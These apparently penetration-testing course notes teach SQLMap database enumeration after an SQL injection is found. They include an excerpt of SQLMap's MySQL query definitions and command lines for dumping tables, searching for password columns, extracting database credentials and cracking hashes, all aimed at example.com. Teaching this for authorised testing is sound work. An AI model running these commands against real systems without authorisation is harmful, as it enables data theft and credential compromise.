# Database Enumeration
Consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.
## SQLMap Data Exfiltration
SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content.

For example, the excerpts from [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) for a MySQL DBMS can be seen below:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```
- For example, if a user wants to retrieve the "banner" (switch `--banner`) for the target based on MySQL DBMS, the `VERSION()` query will be used for such purpose.
- In case of retrieval of the current user name (switch `--current-user`), the `CURRENT_USER()` query will be used.

Retrieving all the usernames (i.e., tag `<users>` requires two queries to be used, depending on the situation:
1. The query marked as `inband` is used in all non-blind situations (i.e., UNION-query and error-based SQLi), where the query results can be expected inside the response itself. 
2. The query marked as `blind`, on the other hand, is used for all blind situations, where data has to be retrieved row-by-row, column-by-column, and bit-by-bit.
## Basic DB Data Enumeration
Enumeration usually starts with the retrieval of the basic information after a successful detection of an SQLi vulnerability, aiming to retrieve:
- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

The following SQLMap command does all of the above:
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
## Table Enumeration
After finding the current database name (i.e. `testdb`), the retrieval of table names would be by using the `--tables` option and specifying the DB name with `-D testdb`, is as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

We then use the `--dump` option and specifying the table name with `-T users` to get its content, as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
## Table/Row Enumeration
When dealing with large tables with many columns and/or rows, we can specify the columns (e.g., only `name` and `surname` columns) with the `-C` option, as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the `--start` and `--stop` options (e.g., start from 2nd up to 3rd entry), as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
## Conditional Enumeration
If there is a requirement to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
## Full DB Enumeration
Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether and simply using the switch `--dump`
- As for the `--dump-all` switch, all the content from all the databases will be retrieved.

> In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
# Advanced Database Enumeration
## DB Schema Enumeration
If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```
## Searching for Data
We can search for databases, tables, and columns of interest, by using the `--search` option.
- Enables us to search for identifier names by using the `LIKE` operator. 

Example: if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

We can also search for all column names based on a specific keyword (e.g. `pass`):
```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```
## Password Enumeration and Cracking
Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option, as previously shown:
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

We can see that SQLMap has automatic password hashes cracking capabilities.
- Upon retrieving any value that resembles a known hash format, SQLMap prompts us to perform a dictionary-based attack on the found hashes.
- If a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.
## DB Users Password Enumeration and Cracking
Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials).
- SQLMap has a special switch `--passwords` designed especially for such a task:
```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
> Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.